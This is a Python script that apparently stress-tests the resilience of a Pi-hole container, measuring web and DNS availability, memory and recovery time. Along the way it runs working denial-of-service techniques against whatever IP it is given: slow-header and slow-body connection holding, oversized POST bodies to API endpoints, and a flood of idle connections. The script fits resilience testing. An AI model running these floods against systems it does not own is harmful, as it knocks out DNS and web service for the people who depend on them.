import socket, sys, time, threading, subprocess
T = sys.argv[1]
def ok(timeout=4):
    try:
        s = socket.create_connection((T, 80), timeout=timeout); s.sendall(b"GET /api/info/login HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n"); d = s.recv(64); s.close(); return d.startswith(b"HTTP/1.1 200")
    except Exception: return False
def dns_ok():
    import struct, os
    q = os.urandom(2) + b"\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x02pi\x04hole\x00\x00\x01\x00\x01"
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.settimeout(2); s.sendto(q, (T, 53)); s.recvfrom(512); return True
    except Exception: return False
def rss(): return subprocess.run(["docker","exec",sys.argv[2],"sh","-c","grep VmRSS /proc/$(pidof pihole-FTL)/status | tr -s ' \t' ' '; ls /proc/$(pidof pihole-FTL)/fd | wc -l"],capture_output=True,text=True).stdout.replace("\n"," ")
print("baseline: web", ok(), "dns", dns_ok(), rss())
# 1. slow headers on N connections
for n in (40, 80, 400):
    socks = []
    for i in range(n):
        try:
            s = socket.create_connection((T, 80), timeout=3); s.sendall(b"GET /admin/login HTTP/1.1\r\nHost: x\r\n"); socks.append(s)
        except Exception: break
    res = []
    for t in range(6):
        for s in socks:
            try: s.sendall(b"X-a: b\r\n")
            except Exception: pass
        res.append(ok(3)); time.sleep(5)
    print(f"slow headers, {len(socks)} of {n} connections opened, held 30 s: normal requests served {sum(res)}/6; dns {dns_ok()}; {rss()}")
    for s in socks: s.close()
    time.sleep(3)
    t0 = time.time()
    while not ok() and time.time() - t0 < 120: time.sleep(2)
    print(f"   recovered {time.time()-t0:.0f}s after the connections closed: {ok()}")
# 2. slow body
socks = []
for i in range(80):
    try:
        s = socket.create_connection((T, 80), timeout=3); s.sendall(b"POST /api/auth HTTP/1.1\r\nHost: x\r\nContent-Length: 1000000\r\n\r\n{"); socks.append(s)
    except Exception: break
res = []
for t in range(6):
    for s in socks:
        try: s.sendall(b" ")
        except Exception: pass
    res.append(ok(3)); time.sleep(5)
print(f"slow request bodies on {len(socks)} connections for 30 s: normal requests served {sum(res)}/6; dns {dns_ok()}; {rss()}")
for s in socks: s.close()
time.sleep(5)
# 3. large bodies
for size, path in ((64 << 20, "/api/auth"), (300 << 20, "/api/auth"), (64 << 20, "/api/teleporter")):
    try:
        s = socket.create_connection((T, 80), timeout=10); s.sendall(f"POST {path} HTTP/1.1\r\nHost: x\r\nContent-Type: application/json\r\nContent-Length: {size}\r\n\r\n".encode())
        chunk = b"A" * (1 << 20); sent = 0; t0 = time.time()
        try:
            for _ in range(size >> 20): s.sendall(chunk); sent += 1
        except Exception as e: pass
        s.settimeout(5)
        try: resp = s.recv(200)
        except Exception: resp = b""
        s.close()
        print(f"body of {size>>20} MiB to {path}: server took {sent} MiB in {time.time()-t0:.1f}s, reply {resp[:40]!r}; web {ok()} dns {dns_ok()}; {rss()}")
    except Exception as e: print("large body error", e)
# 4. connection flood (open and hold idle)
socks = []
for i in range(3000):
    try: socks.append(socket.create_connection((T, 80), timeout=2))
    except Exception: break
print(f"idle connection flood: {len(socks)} sockets opened; web {ok(3)} dns {dns_ok()}; {rss()}")
time.sleep(20); print(f"   after 20 s holding: web {ok(3)} dns {dns_ok()}")
for s in socks: s.close()
t0 = time.time()
while not ok() and time.time() - t0 < 180: time.sleep(2)
print(f"   recovered {time.time()-t0:.0f}s after release: web {ok()} dns {dns_ok()}; {rss()}")
